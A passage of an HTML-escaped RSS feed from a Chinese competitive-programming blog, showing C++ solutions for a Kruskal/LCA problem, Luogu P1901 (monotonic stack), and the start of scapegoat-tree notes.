class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d%d&amp;quot;&lt;/span&gt;,&amp;amp;n,&amp;amp;m);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;i&amp;lt;=n;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        fa[i]=i;&lt;span class=&#34;comment&#34;&gt;//并查集预处理，各个点都处于自己所代表的集合&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;i&amp;lt;=m;i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x,y,z;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d%d%d&amp;quot;&lt;/span&gt;,&amp;amp;x,&amp;amp;y,&amp;amp;z);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Node one;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        one.u=x;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        one.v=y;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        one.w=z;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Q.&lt;span class=&#34;built_in&#34;&gt;push&lt;/span&gt;(one);&lt;span class=&#34;comment&#34;&gt;//加入Kruskal御用队列Q&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;Kruskal&lt;/span&gt;();&lt;span class=&#34;comment&#34;&gt;//最大生成树&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;i&amp;lt;=n;i++) &amp;#123;&lt;span class=&#34;comment&#34;&gt;//倍增数组初始化&amp;amp;dfs&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!vis[i]) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;dfs&lt;/span&gt;(i,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            fas[i][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]=i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            minw[i][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]=inf;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;i&amp;lt;=&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;;i++) &amp;#123;&lt;span class=&#34;comment&#34;&gt;//倍增预处理&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; j=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;j&amp;lt;=n;j++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            fas[j][i]=fas[fas[j][i&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;]][i&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            minw[j][i]=&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;(minw[j][i&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;],minw[fas[j][i&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;]][i&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;,&amp;amp;q);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;i&amp;lt;=q;i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a,b;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d%d&amp;quot;&lt;/span&gt;,&amp;amp;a,&amp;amp;b);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d\n&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;lca&lt;/span&gt;(a,b));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://cubicy.icu/2018/09/28/%E6%B4%9B%E8%B0%B7P1901%20%E5%8F%91%E5%B0%84%E7%AB%99/</guid>
            <title>洛谷:P1901 发射站</title>
            <link>http://cubicy.icu/2018/09/28/%E6%B4%9B%E8%B0%B7P1901%20%E5%8F%91%E5%B0%84%E7%AB%99/</link>
            <category>Stack</category>
            <pubDate>Fri, 28 Sep 2018 13:11:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;原题地址:&lt;a href&gt;https://www.luogu.org/problemnew/show/P1901&lt;/a&gt;  &lt;/p&gt;
&lt;h3 id=&#34;题目简述&#34;&gt;&lt;a href=&#34;#题目简述&#34; class=&#34;headerlink&#34; title=&#34;题目简述&#34;&gt;&lt;/a&gt;题目简述&lt;/h3&gt;&lt;p&gt;有 N 个能量发射站排成一行，每个都有**不相同的高度 $H_i$**，能向两边（当然两端的只能向一边）同时发射能量值为$V_i$ 的能量，并且发出的能量只被两边最近的且比它高的发射站接收。&lt;/p&gt;
&lt;p&gt;显然，每个发射站发来的能量有可能被0或1或2个其他发射站所接受，求接收最多能量的发射站接收的能量是多少。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;思路&#34;&gt;&lt;a href=&#34;#思路&#34; class=&#34;headerlink&#34; title=&#34;思路&#34;&gt;&lt;/a&gt;思路&lt;/h3&gt;&lt;p&gt;每个能量塔射出的能量被左右第一个比其高的塔所拦截。隐隐约约觉得可以用单调栈搞……&lt;br&gt;维护一个高度单调不升栈，考虑&lt;strong&gt;依次&lt;/strong&gt;将能量塔i加入栈：  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;如果高度比栈顶元素大或栈空，栈顶元素能量加上$V_i$，压入栈;  &lt;/li&gt;
&lt;li&gt;如果高度比栈顶元素小（栈顶元素编号记为top），当前能量塔i接收的能量加上$V_{top}$，弹出栈顶元素。重复执行直到符合情况1，按1的处理方法处理。&lt;br&gt;最后直接扫描一遍最大值，输出。&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h3 id=&#34;代码&#34;&gt;&lt;a href=&#34;#代码&#34; class=&#34;headerlink&#34; title=&#34;代码&#34;&gt;&lt;/a&gt;代码&lt;/h3&gt;&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;bits/stdc++.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;namespace&lt;/span&gt; std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; s1[&lt;span class=&#34;number&#34;&gt;1000010&lt;/span&gt;],h[&lt;span class=&#34;number&#34;&gt;1000010&lt;/span&gt;],v[&lt;span class=&#34;number&#34;&gt;1000010&lt;/span&gt;],sum[&lt;span class=&#34;number&#34;&gt;1000010&lt;/span&gt;],ans,n,top;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;,&amp;amp;n);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;i&amp;lt;=n;i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d%d&amp;quot;&lt;/span&gt;,&amp;amp;h[i],&amp;amp;v[i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(top&amp;amp;&amp;amp;h[s1[top]]&amp;lt;h[i])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            sum[i]+=v[s1[top]],top--;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sum[s1[top]]+=v[i];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        top++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        s1[top]=i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;i&amp;lt;=n;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ans=&lt;span class=&#34;built_in&#34;&gt;max&lt;/span&gt;(ans,sum[i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;,ans);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://cubicy.icu/2018/08/03/%E6%9B%BF%E7%BD%AA%E7%BE%8A%E6%A0%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</guid>
            <title>替罪羊树学习笔记</title>
            <link>http://cubicy.icu/2018/08/03/%E6%9B%BF%E7%BD%AA%E7%BE%8A%E6%A0%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</link>
            <category>Treap</category>
            <pubDate>Fri, 03 Aug 2018 16:53:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;博客咕咕咕了好久……最近会逐步继续恢复更新博客的。&lt;br&gt;最近又在学习二叉搜索树。实测发现替罪羊树快的飞起(时间约Splay的1&amp;#x2F;2)~写起来还比较简单，决定来一波。&lt;br&gt;（那为什么还要用Splay呢？因为Splay是序列之王！还能维护LCT！（你要用非旋Treap（FHQ-Treap）我也没意见））&lt;br&gt;替罪羊树的主要思想就是当出现重量失衡的时候，&lt;strong&gt;把罪魁祸首的那个子树拎出来，重新按最完美的方式（也就是近似完全二叉树）构造一遍再接回去&lt;/strong&gt;。&lt;br&gt;如何定义某个子树不平衡：当这个子树的左右子树其中之一的“重量”（节点个数）超过了整个子树的α*100%时，我们认为这个子树不平衡。&lt;br&gt;举例：α&amp;#x3D;0.75时，如果一个子树左子树有4个节点，右子树有1个，这个子树大小就是4+1+1&amp;#x3D;6，左子树占比超过了α*100%（即75%），这个子树不平衡，需要重构。&lt;br&gt;显然，α取值介于0.5至1.0之间，越小树越平衡但重构次数越多，越大重构次数越少但树越不平衡。太大太小都会出事。&lt;strong&gt;一般而言，α取0.75&lt;/strong&gt;。如果题目查询次数远大于插入次数，可略微降低α取值（比如α&amp;#x3D;0.70）；若远小于，则略升高（如α&amp;#x3D;0.80）。&lt;br&gt;下面以&lt;a href=&#34;https://www.luogu.org/problemnew/show/P3369&#34;&gt;洛谷3369【模板】普通平衡树&lt;/a&gt;为例：  &lt;/p&gt;
&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//这个板子有改进之处：比如删除节点可以打上删除懒标记，单个节点可以记录同一数字数量避免多余节点。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;cstdio&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;cstdlib&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; inf 